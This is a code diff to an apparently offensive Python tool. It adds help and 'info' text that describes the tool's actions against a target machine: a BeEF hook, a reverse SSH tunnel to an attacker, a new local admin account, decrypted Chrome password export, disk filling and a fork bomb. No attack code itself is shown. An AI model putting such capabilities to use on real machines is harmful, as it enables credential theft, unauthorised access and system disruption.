@@ -169,33 +169,62 @@ while True:
     if action == "help":
         logging.info(f"Chosen action help to show available actions")
         print(Fore.YELLOW + "Choose action manual: ")
+        sleep(0.1)
+        print_line()
         print(" ")
         sleep(0.1)
         print("result) Print current machine scan outcome (only usable after action 1)") 
         sleep(0.1)
+        print("")
+        sleep(0.1)
         print("scan) Scans this machine: OS, network name, machine type, platform info, local IP address")
+        sleep(0.1)
+        print("")
         sleep(0.1)
         print("hook) Attempt to hook this machine via BeEF: requires BeEF running on attacker machine")
         sleep(0.1)
+        print("")
+        sleep(0.1)
         print("ssh) Attempt a local SSH connection: requires openSSH installed and configured, also requires listener script running on attacker machine")
+        sleep(0.1)
+        print("")
         sleep(0.1)
         print("ftp) Attempt a FTP connection: requires FTP server running on attacker machine")
         sleep(0.1)
+        print("")
+        sleep(0.1)
         print("ping) Check IP connectivity and response: pings target/attacker IP to check connectivity and response time")
+        sleep(0.1)
+        print("")
         sleep(0.1)
         print("DiskFill) Run diskfiller to fill up disk space: runs diskfiller.bat to fill up disk space on target machine")
         sleep(0.1)
+        print("")
+        sleep(0.1)
         print("DiskHost) Localy host a disk of the target machine: hosts current folder via python http server on port 8100")
+        sleep(0.1)
+        print("")
         sleep(0.1)
         print("AddAdmin) Generate a new admin account on target machine")
         sleep(0.1)
+        print("")
+        sleep(0.1)
         print("PassExport) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser")
+        sleep(0.1)
+        print("")
         sleep(0.1)
         print("ForkBomb) Attemps a forkbomb on current machine potetionally leaving without any logging")
         sleep(0.1)
+        print("")
+        sleep(0.1)
         print("info) used as a help command, combine info with a Mole command to see its details")
         sleep(0.1)
+        print("")
+        sleep(0.1)
         print("exit) To exit the program")
+        sleep(0.1)
+        print("")
+        print_line()
         input("Press Enter to continue...")
 
 #
@@ -223,7 +252,7 @@ while True:
            cls()
         else:
             cls()
-            print("Scan was not initiated (action 1), run scan first")
+            print("Scan was not initiated (action 'scan'), run scan first")
             logging.error(f"Scan not initiated, action 0 cannot proceed")
             sleep(4)
     else:
@@ -852,11 +881,106 @@ while True:
     #
     # 
 
-    
-    #Action exit = exiting the program
-        if action == "exit":
-            logging.info(f"Chosen action PassExport to exit the program")
-            print("Exiting the program...")
-            sleep(3)
 
-            exit()
+    #Action exit = exiting the program
+    if action == "exit":
+        logging.info(f"Chosen action PassExport to exit the program")
+        print("Exiting the program...")
+        sleep(3)
+
+        exit()
+
+    if action == "info result":
+        print("result) Print current machine scan outcome (only usable after action 'scan'), usable for seeing scan results without having to rescan the machine") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info scan":
+        print("scan) Scans this machine: OS, network name, machine type, platform info, local IP address, stores the scan results in " \
+        "scan_results.json file") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...") 
+        cls()
+
+    if action == "info hook":
+        print("hook) Attempt to hook this machine via BeEF: requires BeEF running on attacker machine, opens the hook URL in default browser") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info ssh":
+        print("ssh) Attempt a local SSH connection: requires openSSH installed and configured, also requires listener script running on attacker machine, sets up a reverse SSH tunnel to attacker machine") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info ftp":
+        print("ftp) Attempt a FTP connection: requires FTP server running on attacker machine, opens an FTP connection to attacker machine") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info ping":
+        print("ping) Check IP connectivity and response: pings target/attacker IP to check connectivity and response time") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info DiskFill":
+        print("DiskFill) Run diskfiller to fill up disk space: runs diskfiller.bat to fill up disk space on target machine") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info DiskHost":
+        print("DiskHost) Localy host a disk of the target machine: hosts current folder via python http server on port 8100") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info AddAdmin":
+        print("AddAdmin) Generate a new admin account on target machine: creates a new user and adds it to local administrators group") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info PassExport":
+        print("PassExport) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser, saves results to chrome_passwords.json") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    if action == "info ForkBomb":
+        print("ForkBomb) Attempt a forkbomb on current machine: creates and runs a batch file that continuously spawns new instances of itself, potentially crashing the system") 
+        sleep(0.1) 
+        print("")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
+
+    else:
+        print("Invalid action, please choose a valid command or select 'help' to see available actions.")
+        sleep(0.1)
+        input("Press Enter to continue...")
+        cls()
